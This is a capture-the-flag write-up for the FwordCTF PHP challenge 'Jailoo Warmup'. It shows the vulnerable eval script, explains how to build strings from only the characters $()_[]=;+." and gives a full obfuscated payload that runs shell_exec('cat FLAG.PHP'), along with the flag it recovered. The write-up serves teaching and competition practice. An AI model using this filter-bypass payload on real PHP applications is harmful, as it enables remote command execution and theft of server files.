# web / JAILOO WARMUP

> Points: 442

## Question

> Read the flag in `FLAG.PHP`. \
> https://jailoowarmup.fword.wtf

## Solution

We are given the contents of `jailoo.php`.

```php
<?php
    if(sizeof($_REQUEST)===2&& sizeof($_POST)===2){
    $cmd=$_POST['cmd'];
    $submit=$_POST['submit'];
    if(isset($cmd)&& isset($submit)){
        if(preg_match_all('/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/', $cmd, $matches)){
            echo "<div class=\"success\">Command executed !</div>";
            eval($cmd);
        }else{
            die("<div class=\"error\">NOT ALLOWED !</div>");
        }
    }else{
        die("<div class=\"error\">NOT ALLOWED !</div>");
    }
    }else if ($_SERVER['REQUEST_METHOD']!="GET"){
        die("<div class=\"error\">NOT ALLOWED !</div>");
    }
     ?>
```

The `preg_match_all` is enforcing that commands can only contain the characters
`$()_[]=;+."`. An undocumented restriction on `preg_match_all` is also that the input
can be a maximum of 2048 characters long.

PHP has a weird quirk where you can call strings as builtin functions. For example,
the top line of the above PHP file could have been `if ( ('sizeof')($_REQUEST) === 2 )`.
This means that if we can construct arbitrary strings, we can write arbitrary PHP.
We can concatenate strings with `.`, so we only need arbitrary characters.

Taking inspiration from [PHPFuck](https://splitline.github.io/PHPFuck/), we can use the
primitive empty array `[]` and string `""` to generate a few things.

1. `"" == 0`, a useful primitive.
1. `([]==[]) === true == 1`, from this we can get any number by stringing together
  a bunch of `([]==[])+([]==[])+...`'s.
1. `([].[]) === "ArrayArray"`, using this and our numbers, we can extract the characters
  `([].[])[""] === "A"` and `([].[])[([]==[])+([]==[])+([]==[])] === "a"`.
1. The underscore is the only valid variable name character we have (`$_`, `$__`, etc),
  and incrementing a character moves up the sorting order, so `$_="A";$_++;`
  will put `"B"` in `$_`.
1. `('chr')(32) === " "` to get the space character.
1. From this, we can now construct arbitrary strings.

Originally planning to `var_dump(file_get_contents("FLAG.PHP"))`, this turned out to be too long.
We managed to make it work using `var_dump(shell_exec("cat FLAG.PHP"))` with this payload:

```php
$_=([].[])[""];$__=$_;$_++;$_++;$_++;$_++;$_++;$___=$_;$_++;$____=$_;$_++;$_____=$_;$_++;$_++;$_++;$_++;$______=$_;$_++;$_++;$_++;$_++;$_______=$_;$_=([].[])[(""=="")+(""=="")+(""=="")];$________=$_;$_++;$_++;$_________=$_;$_++;$__________=$_;$_++;$___________=$_;$_++;$_++;$_++;$____________=$_;$_++;$_++;$_++;$_++;$_____________=$_;$_++;$______________=$_;$_++;$_++;$_++;$_______________=$_;$_++;$_++;$________________=$_;$_++;$_________________=$_;$_++;$__________________=$_;$_++;$___________________=$_;$_++;$____________________=$_;$_++;$_++;$_____________________=$_;($____________________.$________.$________________."_".$__________.$___________________.$______________.$_______________)(($_________________.$____________.$___________.$_____________.$_____________."_".$___________.$_____________________.$___________.$_________)($_________.$________.$__________________.($_________.$____________.$________________)((""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")).$___.$______.$__.$____.".".$_______.$_____.$_______));
```

Or prettified a little:

```php
$_=([].[])[""]; # A
$__=$_; # Store A
$_++;$_++;$_++;$_++;$_++;$___=$_; # Store F
$_++;$____=$_; # Store G
$_++;$_____=$_; # Store H
$_++;$_++;$_++;$_++;$______=$_; # Store L
$_++;$_++;$_++;$_++;$_______=$_; # Store P
$_=([].[])[(""=="")+(""=="")+(""=="")]; # a
$________=$_; # Store a
$_++;$_++;$_________=$_; # Store c
$_++;$__________=$_; # Store d
$_++;$___________=$_; # Store e
$_++;$_++;$_++;$____________=$_; # store h
$_++;$_++;$_++;$_++;$_____________=$_; # store l
$_++;$______________=$_; # store m
$_++;$_++;$_++;$_______________=$_; # store p
$_++;$_++;$________________=$_; # store r
$_++;$_________________=$_; # store s
$_++;$__________________=$_; # store t
$_++;$___________________=$_; # store u
$_++;$____________________=$_; # store v
$_++;$_++;$_____________________=$_; # store x
# var_dump
($____________________.$________.$________________."_".$__________.$___________________.$______________.$_______________)(
  # shell_exec
  ($_________________.$____________.$___________.$_____________.$_____________."_".$___________.$_____________________.$___________.$_________)(
    # "cat"
    $_________.$________.$__________________ .
    # chr(32) = " "
    ($_________.$____________.$________________)(
      (""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+
      (""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+
      (""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+
      (""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")+(""=="")
    ) .
    # "FLAG.PHP"
    $___.$______.$__.$____.".".$_______.$_____.$_______
  )
);
```

Running this and checking the HTML shows:

```html
<div class="success">Command executed !</div>
string(70) "<?
$flag="FwordCTF{Fr0m_3very_m0unta1ns1d3_l3t_fr33d0m_r1ng_MLK}";
?>
"
```

### Flag

`FwordCTF{Fr0m_3very_m0unta1ns1d3_l3t_fr33d0m_r1ng_MLK}`
